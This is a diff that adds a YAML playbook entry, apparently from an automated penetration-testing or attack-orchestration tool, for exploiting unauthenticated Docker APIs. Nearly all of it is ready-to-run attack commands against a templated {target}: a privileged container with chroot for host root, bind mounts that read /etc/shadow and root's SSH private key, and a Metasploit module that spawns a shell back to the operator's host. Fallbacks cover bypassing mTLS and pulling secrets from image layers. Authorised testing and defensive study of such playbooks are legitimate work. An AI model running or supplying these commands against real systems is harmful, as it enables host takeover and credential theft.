@@ -1,0 +1,37 @@
+id: service_docker_api_unauth
+title: "Docker API — unauth → container → host root"
+phase: exploit
+mitre: ["T1610", "T1611", "T1613"]
+trigger:
+  services: ["docker", "docker-api"]
+  ports:    [2375, 2376, 4243, 5000]
+keywords: ["docker", "docker api", "docker socket", "container escape"]
+preconditions:
+  - "TCP/2375 reachable (no TLS) OR exposed Docker socket"
+steps:
+  - tool: curl
+    cmd:  "curl -s http://{target}:2375/version"
+    why:  "Confirm unauth Docker API + version"
+  - tool: docker
+    cmd:  "docker -H tcp://{target}:2375 version; docker -H tcp://{target}:2375 ps -a; docker -H tcp://{target}:2375 images"
+    why:  "Enum running containers + cached images"
+  - tool: docker
+    cmd:  "docker -H tcp://{target}:2375 run -it --rm --privileged --pid=host -v /:/host alpine chroot /host /bin/sh"
+    why:  "Classic privileged-container → host root chroot — instant SYSTEM-equivalent"
+  - tool: docker
+    cmd:  "docker -H tcp://{target}:2375 run --rm -v /etc/shadow:/loot/shadow -v /root/.ssh/:/loot/ssh/ alpine cat /loot/shadow /loot/ssh/id_rsa"
+    why:  "File exfil without privileged flag — host paths bind-mounted"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/linux/http/docker_daemon_tcp; set RHOSTS {target}; set RPORT 2375; set LHOST {LHOST}; run'"
+    why:  "Automated chain — exploit module spawns shell on host"
+  - tool: nuclei
+    cmd:  "nuclei -t http/misconfiguration/docker-api-unauth.yaml -u http://{target}:2375/"
+    why:  "Quick confirm + tags any other Docker exposures"
+expected_outcome: "Host root via privileged container escape; sensitive file exfil via bind-mount"
+fallbacks:
+  - "TLS enabled → mTLS bypass via leaked /etc/docker/certs/ from another vuln"
+  - "Docker registry on 5000 → image enum, secret extraction from layers (docker save | tar -xvf)"
+  - "If only Docker Swarm Manager → join as worker node, then privileged escape"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker"
+  - "https://github.com/cdk-team/CDK"
